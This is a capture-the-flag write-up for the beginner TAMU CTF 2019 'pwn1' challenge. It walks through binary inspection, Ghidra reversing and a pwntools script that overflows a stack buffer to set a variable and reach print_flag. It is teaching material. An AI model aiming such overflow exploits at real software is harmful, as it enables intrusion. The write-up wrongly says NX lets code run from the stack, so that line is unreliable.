---
title: Tamu19 pwn1
description: Beginner-level 32-bit buffer overflow challenge from Tamu CTF 2019.
---

![1_HmcCGfu1d5uyg3Ry1Vz3iA](https://github.com/user-attachments/assets/428db926-4396-42df-836d-23cead2bbe92)

`Date: 20 September 2025 `

This is Beginner-level 32-bit buffer overflow challenge from Tamu CTF 2019.

### Table of content

1. [Basic Info](#basic-info)
2. [Reversing with Ghidra](#Reversing-with-Ghidra)
3. [Exploit](#exploit)
4. [Conclusion](#conclusion)

### Basic Info

First we will begin with checking the type and security of the binary -

```
kris3c@0x4B1T-ubuntu:~/$ file pwn1
```

```
pwn1: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped
```

```
kris3c@0x4B1T-ubuntu:~/$ pwn checksec pwn1
```

```
[*] '/home/kris3c/Main/Nightmare/nightmare/modules/04-bof_variable/tamu19_pwn1/pwn1'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

We can see it's a ELF 32 bit binary using LSB (Least Signifiicate Byte) format and also its a PIE means it does not have fixed virtual addresses.

From the Security we can see it's full RELRO means the global offset table is read only so we can't change the addresses of the functions provided by the linked library.

NX is enabled means we can run code directly from stack.

The interesting thing to note here is there is no stack canary means we can write into stack from variable to another (overflow).

We can run the binary on our system but make sure you have linker for 32 bit binaries and you can check it with -

```
kris3c@0x4B1T-ubuntu:~/$ ldd pwn1 
```

```
	linux-gate.so.1 (0xf7003000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf6da0000)
	/lib/ld-linux.so.2 (0xf7005000)
```

If you don't get similar output to this do -

```
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install libc6:i386 lib32z1
```

Running the binary -


<img width="1593" height="161" alt="Screenshot From 2025-09-20 13-32-44" src="https://github.com/user-attachments/assets/f8aca9f9-c241-4d90-aef6-dc8351202454" />

Afer running the binary it gives a prompt saying `Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
` and whatever we enter it says `I don't know that! Auuuuuuuugh!`. 

### Reversing with Ghidra

Now let's open the binary in ghidra so that we can get a higher level view of the binary.


<img width="507" height="843" alt="Screenshot From 2025-09-20 12-37-26" src="https://github.com/user-attachments/assets/2b818db6-49bd-45c5-b90c-8e1fc997ccb7" />

From here we can easily understand the execution flow of the binary -

1. Prompting and asking for input which getting stored in `local_43` then comparing the input with `Sir Lancelot of Camelot` if not matched then print `I don\'t know that! Auuuuuuuugh!`.
2. Second Prompt and asking for another input storing it in `local_43` then comapring it with `To seek the Holy Grail.` if not matched then prints the same message mentioned in the first point.
3. Giving Last prompt and taking input which is stored in `local_43` but time comparing the data stored in `local_18` with `-0x215eef38` if this check passes it will call the `print_flag` function -
	- <img width="750" height="588" alt="Screenshot From 2025-09-20 13-41-29" src="https://github.com/user-attachments/assets/1acffb41-04e8-456f-9469-74380042f791" />


From here we know we need to find a way to put `0xdea110c8` (hover the mouse cursor over the value) in variable `local_18` so for this we can look at the stack (doible click on any variable from the decleration section) -

<img width="883" height="348" alt="Screenshot From 2025-09-20 13-47-49" src="https://github.com/user-attachments/assets/4ad0f1cf-82bc-445e-9bdf-83dd0ff208f9" />


Position of the variable `local_43` on the stack is `-0x43` and position of the variable `local_18` is `-0x18` so if we store more number of bytes than the size of the `local_43` it will go into `local_18`. Here the size of the `local_43` is 43. 

### Exploit

After getting also the important piece of information we can finally write the exploit -

```python
from pwn import *

p = process('./pwn1')

p.sendlineafter(b"What... is your name?",b"Sir Lancelot of Camelot")
p.sendlineafter(b"What... is your quest?",b"To seek the Holy Grail.")
p.sendlineafter(b"What... is my secret?",b'\x00'*43+p32(0xdea110c8))

print(p.recvall().decode())

```

Running the script - 

```
kris3c@0x4B1T-ubuntu:~/$ ./my_script.py
```

Output -

``` 
[+] Starting local process './pwn1': pid 11107
[+] Receiving all data: Done (39B)
[*] Process './pwn1' stopped with exit code 0 (pid 11107)

Right. Off you go.
flag{REDACTED}
```

We got the flag and this marks the end of this writeup.

### Conclusion

This 32-bit PIE binary had NX and full RELRO, but no stack canary, allowing a buffer overflow to overwrite a critical variable and trigger print_flag, successfully retrieving the flag./tree/main/src
